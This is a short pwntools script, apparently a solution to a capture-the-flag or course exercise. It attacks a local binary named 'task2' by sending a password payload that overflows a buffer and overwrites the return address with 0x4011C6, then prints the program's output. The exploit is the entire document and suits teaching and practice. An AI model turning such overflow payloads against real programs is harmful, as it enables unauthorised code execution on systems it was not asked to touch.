from pwn import *


io = process("./task2")
io.recvuntil("Enter password:")
password = b'A' * 8 + p64(0) + b'A' * 24 + p64(0x4011C6)
io.sendline(password)

while True:
	try:
		# use "readline" from pwntools
		line = io.recvline().decode('ascii')
		print(line)
	except:
		# could not read line => program exited
		break
io.kill()

# io.interactive()